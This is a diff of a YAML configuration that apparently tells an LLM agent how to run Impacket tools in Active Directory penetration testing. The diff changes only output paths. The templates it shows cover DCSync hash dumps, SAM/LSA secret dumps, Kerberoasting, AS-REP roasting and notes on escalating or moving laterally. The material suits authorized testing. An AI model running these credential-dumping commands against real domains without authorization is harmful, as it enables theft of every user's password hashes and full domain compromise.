@@ -207,17 +207,17 @@ usage_patterns:
   # ── DCSync / credential dump ─────────────────────────────────────
   - name: "DCSync — dump all domain user NT hashes (NTLM only)"
     binary: "impacket-secretsdump"
-    command: "{domain}/{user}:{password}@{dc_host} -just-dc-ntlm -outputfile /session/loot/secretsdump"
-    when: "Post-exploitation: extract every domain user's NT hash from the DC via DCSync (DRSUAPI). Requires DA or 'Replicating Directory Changes' permission. Outputs hashes.txt + ntds.json under /session/loot/."
+    command: "{domain}/{user}:{password}@{dc_host} -just-dc-ntlm -outputfile /session/output/loot/secretsdump"
+    when: "Post-exploitation: extract every domain user's NT hash from the DC via DCSync (DRSUAPI). Requires DA or 'Replicating Directory Changes' permission. Outputs hashes.txt + ntds.json under /session/output/loot/."
 
   - name: "DCSync via Kerberos ticket (no password)"
     binary: "impacket-secretsdump"
-    command: "{domain}/{user}@{dc_host} -k -no-pass -just-dc-ntlm -outputfile /session/loot/secretsdump"
+    command: "{domain}/{user}@{dc_host} -k -no-pass -just-dc-ntlm -outputfile /session/output/loot/secretsdump"
     when: "Same as DCSync but using existing Kerberos ccache (KRB5CCNAME env). Ideal after getTGT or pass-the-ticket."
 
   - name: "Local secrets dump (SAM + LSA from a member host)"
     binary: "impacket-secretsdump"
-    command: "{domain}/{user}:{password}@{target} -outputfile /session/loot/{target}-local"
+    command: "{domain}/{user}:{password}@{target} -outputfile /session/output/loot/{target}-local"
     when: "Dump local SAM, LSA secrets, cached domain creds from a member server/workstation. Requires local admin. Different from DCSync (which targets the DC)."
 
   # ── Lateral movement ─────────────────────────────────────────────
@@ -254,17 +254,17 @@ usage_patterns:
   # ── Kerberos attacks ─────────────────────────────────────────────
   - name: "Kerberoast — request TGS for all SPN accounts"
     binary: "impacket-GetUserSPNs"
-    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/loot/kerberoast.txt"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/output/loot/kerberoast.txt"
     when: "Enumerate accounts with SPNs and request their TGS tickets (for offline cracking). Any domain user can run this. Outputs $krb5tgs$ hashes. NOTE: the binary is impacket-GetUserSPNs (camelCase) — common typo: impacket-getuserspns does NOT exist."
 
   - name: "AS-REP roast — extract hashes for DONT_REQUIRE_PREAUTH accounts"
     binary: "impacket-GetNPUsers"
-    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/loot/asreproast.txt"
+    command: "{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /session/output/loot/asreproast.txt"
     when: "Find accounts with Kerberos preauth disabled and extract their AS-REP for offline cracking. Authenticated form. NOTE: binary is impacket-GetNPUsers (camelCase)."
 
   - name: "AS-REP roast — unauthenticated (with username list)"
     binary: "impacket-GetNPUsers"
-    command: "{domain}/ -dc-ip {dc_ip} -no-pass -usersfile {users_file} -outputfile /session/loot/asreproast.txt"
+    command: "{domain}/ -dc-ip {dc_ip} -no-pass -usersfile {users_file} -outputfile /session/output/loot/asreproast.txt"
     when: "AS-REP roast WITHOUT credentials. Pass a newline-separated username file (often from kerbrute userenum). The trailing slash after domain is required."
 
   - name: "Get a Kerberos TGT (for pass-the-ticket / pass-the-key)"
@@ -391,8 +391,8 @@ gotchas:
   - "smbclient file ops need stdin choreography: 'use SHARE\\ncd \\\\dir\\nget file\\nexit\\n'. Paths use Windows backslashes (replace '/' with '\\\\'). The downloaded file lands in the binary's CWD."
   - "Some sub-binaries take a SUBCOMMAND positional: 'impacket-dpapi backupkeys -t <host>' (dpapi uses -t, not @host); 'impacket-exchanger <user:pass@host> nspi' (subcommand AFTER identity). For services/reg/net/tstool/wmipersist, the action keyword (list/start/stop/query/install/...) is positional AFTER the identity string."
   - "PsExec output 'is not writable' on every share = no admin rights. Classify as permission failure even if exit==0; switch to wmiexec or smbexec or escalate. Other Kerberos error codes worth catching: KDC_ERR_CLIENT_REVOKED (account locked/disabled), KDC_ERR_KEY_EXPIRED (password expired - use changepasswd), KDC_ERR_ETYPE_NOSUPP (DC etype mismatch). SMB additions: STATUS_PASSWORD_MUST_CHANGE, STATUS_SHARING_VIOLATION (file locked, retry), STATUS_BAD_NETWORK_NAME (share not found)."
-  - "krb5.conf: legacy mcp-server.py auto-generated /etc/krb5.conf with [libdefaults]/[realms]/[domain_realm] on first Kerberos call. The kind:cli image relies on whatever is baked into the image, OR a krb5.conf the LLM writes via the bash tool to /session/config/krb5.conf and copies into /etc/. If KDC_ERR_*/'realm not local' errors appear with valid creds and DC connectivity, missing krb5.conf is the usual cause."
-  - "ccache auto-promotion (RETIRED in kind:cli): legacy mcp-server.py parsed 'Saving ticket in <path>.ccache' from getTGT/getST stdout and copied to /session/credentials/<safe_principal>.ccache. Under run_cli the binary writes to its CWD; the agent must -outputfile-equivalent or move the file explicitly to /session/. Set CWD via 'cd /session && impacket-getTGT ...' or rely on container default CWD if it is /session."
+  - "krb5.conf: legacy mcp-server.py auto-generated /etc/krb5.conf with [libdefaults]/[realms]/[domain_realm] on first Kerberos call. The kind:cli image relies on whatever is baked into the image, OR a krb5.conf the LLM writes via the bash tool to /session/output/config/krb5.conf and copies into /etc/. If KDC_ERR_*/'realm not local' errors appear with valid creds and DC connectivity, missing krb5.conf is the usual cause."
+  - "ccache auto-promotion (RETIRED in kind:cli): legacy mcp-server.py parsed 'Saving ticket in <path>.ccache' from getTGT/getST stdout and copied to /session/output/credentials/<safe_principal>.ccache. Under run_cli the binary writes to its CWD; the agent must -outputfile-equivalent or move the file explicitly to /session/output/. Set CWD via 'cd /session && impacket-getTGT ...' or rely on container default CWD if it is /session."
   - "impacket-rbcd / impacket-changepasswd / impacket-addspn (krbrelayx): legacy implementations called scripts under /opt/impacket-scripts/ and /opt/krbrelayx/ rather than impacket-* CLIs. The kind:cli image SHOULD have impacket-rbcd / impacket-changepasswd / impacket-addspn on PATH; if 'command not found' appears, fall back to 'python3 /opt/impacket-scripts/<name>.py' or 'python3 /opt/krbrelayx/addspn.py'. addspn flag style is non-standard: -u DOMAIN\\\\user -p pass -t target -s spn [-r] <dc_host>."
   - "Feature 28 dynamic recipes (RECIPE_DIR=/session/recipes/impacket — note: NOT /session/tool_recipes/impacket like other tools) are RETIRED for the kind:cli path; the LLM writes argv directly. Recipes still load if directory exists for legacy method calls but are a dead branch under run_cli (REQ-TR-016)."
 
